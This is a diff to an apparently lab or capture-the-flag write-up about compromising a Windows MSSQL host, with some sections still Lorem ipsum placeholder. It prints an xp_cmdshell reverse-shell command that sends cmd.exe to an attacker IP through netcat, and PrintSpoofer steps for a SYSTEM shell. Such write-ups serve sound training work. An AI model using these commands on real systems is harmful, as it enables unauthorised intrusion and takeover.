@@ -241,9 +241,7 @@ Enumerated top 200 UDP ports:
 
 #### - I then typed "xp_cmdshell \\[Kali IP]\Share\nc64.exe -e cmd.exe 192.168.49.114 3389" on the mssql target machine and received a reverse shell on the listener:
 
-
-
-
+![](Pasted%20image%2020221020010759.png)
 ---
 
 # Lateral Movement to user
@@ -257,7 +255,22 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor
 
 # Privilege Escalation
 ## Local Enumeration
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+
+#### - Typed "whoami /priv" and found SeImpersonatePrivilege was enabled:
+
+![](Pasted%20image%2020221020011101.png)
+#SeImpersonatePrivilege 
+
+#### -Navigated to directory "C:\Users\Public"
+
+#### - Typed "copy \\[Kali IP]\Share\PrintSpoofer64.exe" to copy the PrintSpoofer64.exe compiled privesc exploit on the target machine
+
+#PrintSpoofer64.exePrivescExploit
+
+#### - Typed "PrintSpoofer64.exe -i -c cmd" and received a shell running with system privileges:
+
+
+
 
 ## Privilege Escalation vector
 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
